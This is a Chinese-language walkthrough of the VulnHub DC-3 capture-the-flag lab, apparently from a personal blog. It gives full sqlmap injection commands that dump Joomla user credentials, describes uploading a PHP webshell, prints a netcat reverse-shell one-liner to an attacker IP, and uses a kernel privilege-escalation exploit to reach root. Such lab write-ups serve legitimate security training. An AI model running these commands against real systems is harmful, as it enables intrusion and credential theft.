---
title: DC-3复现
tags: 
  - vulnhub
  - 渗透测试
permalink: /archives/4926/
createTime: 2022-06-05 05:31:23
---

# DC-3复现

## 描述

> DC-3 是另一个特意建造的易受攻击的实验室，旨在获得渗透测试领域的经验。
>
> 与之前的 DC 版本一样，这个版本是为初学者设计的，虽然这一次，只有一个标志，一个入口点，根本没有任何线索。
>
> 必须具备 Linux 技能和熟悉 Linux 命令行，以及一些基本渗透测试工具的经验。
>
> 对于初学者来说，谷歌可以提供很大的帮助，但你可以随时在@DCAU7 上给我发推文，寻求帮助，让你重新开始。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。
>
> 对于那些有 CTF 和 Boot2Root 挑战经验的人来说，这可能不会花你很长时间（事实上，它可能会花费你不到 20 分钟的时间）。
>
> 如果是这种情况，并且如果您希望它更具挑战性，您可以随时重做挑战并探索其他获得根和获得旗帜的方法。

## 开始

### 信息收集

- 扫描C段看找到目标机器的ip

![image-20220605024811027](https://img.crzliang.cn/img/image-20220605024811027.png)

- 然后看都开了哪些端口，扫到了80端口

![image-20220605024905636](https://img.crzliang.cn/img/image-20220605024905636.png)

- 直接访问ip看到这个网站用的是joomla的框架，那我们可以尝试利用joomscan工具获取更加详细的信息

![image-20220605025205577](https://img.crzliang.cn/img/image-20220605025205577.png)

- 因为kali并没有集成该工具，所以需要下载

- 安装命令`apt install joomscan`

- 安装好之后利用工具查看版本等信息`joomscan -u http://192.168.207.142/`

![image-20220605025824356](https://img.crzliang.cn/img/image-20220605025824356.png)

- 在报告中不仅仅看到了版本信息，还有后台的管理地址
- 再利用searchploit查找有关的漏洞

![image-20220605030809920](https://img.crzliang.cn/img/image-20220605030809920.png)

- 再用命令查看txt文本`cat /usr/share/exploitdb/exploits/php/webapps/42033.txt`

![image-20220605031036970](https://img.crzliang.cn/img/image-20220605031036970.png)

- 从中我们得知漏洞的利用方法

### 渗透开始

#### sqlmap

- 直接跑payload

```sql
sqlmap -u "http://192.168.20.142/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

- 得到了5个数据库，直接查看joomladb数据库中的表

![image-20220605032447411](https://img.crzliang.cn/img/image-20220605032447411.png)

```sql
sqlmap -u "http://192.168.207.142/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]
```

![image-20220605032852389](https://img.crzliang.cn/img/image-20220605032852389.png)

- 查列名

```sql
sqlmap -u "http://192.168.207.142/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml"  --risk=3 --level=5 --random-agent -D joomladb  -T "#__users" --columns   -p list[fullordering]
```

![image-20220605040539515](https://img.crzliang.cn/img/image-20220605040539515.png)

- 查找字段信息

```sql
sqlmap -u "http://192.168.207.142/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml"  --risk=3 --level=5 --random-agent -D joomladb  -T "#__users" -C "name,password,username" --dump   -p list[fullordering]

```

![image-20220605040758091](https://img.crzliang.cn/img/image-20220605040758091.png)

#### john破解

- 得到密码：snoopy

![image-20220605041557479](https://img.crzliang.cn/img/image-20220605041557479.png)

#### 传马

- 然后进入前面找到的后台管理地址，发现该网站可以上传一句话木🐎，那就传，然后用蚁剑连接

![image-20220605043121693](https://img.crzliang.cn/img/image-20220605043121693.png)

- 随便点一个

![image-20220605043207589](https://img.crzliang.cn/img/image-20220605043207589.png)

- 新建一个php文件用来传马

![image-20220605043329807](https://img.crzliang.cn/img/image-20220605043329807.png)

- 找到新建的php文件并写入马的内容，并保存

![image-20220605043532371](https://img.crzliang.cn/img/image-20220605043532371.png)

#### 蚁剑连接

- 打开蚁剑连接

![image-20220605044206406](https://img.crzliang.cn/img/image-20220605044206406.png)

#### 反弹shell

```txt
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.207.129 443 >/tmp/f
```

![image-20220605051113753](https://img.crzliang.cn/img/image-20220605051113753.png)

#### 漏洞利用

- 用命令uname -a查看内核版本，经过百度对应的是Ubuntu 16.04

![image-20220605051135777](https://img.crzliang.cn/img/image-20220605051135777.png)

- 再次利用searchsploit查找有关Ubuntu 16.04的漏洞

![image-20220605045904252](https://img.crzliang.cn/img/image-20220605045904252.png)

- 打开文件并查看漏洞利用方法

![image-20220605050130615](https://img.crzliang.cn/img/image-20220605050130615.png)

- 下载exp到靶机上，并解压

![](https://img.crzliang.cn/img/image-20220605052037421.png)

> 解压后依次进入39772文件夹
>
> 再解压exploit.tar，然后再进入ebpf_mapfd_doubleput_exploit，并运行./compile.sh，然后再运行./doubleput

![image-20220605052434258](https://img.crzliang.cn/img/image-20220605052434258.png)

- 然后在进到root目录，就看到了flag

![image-20220605052534589](https://img.crzliang.cn/img/image-20220605052534589.png)

- 最后再cat一下就得到flag

![image-20220605052605567](https://img.crzliang.cn/img/image-20220605052605567.png)
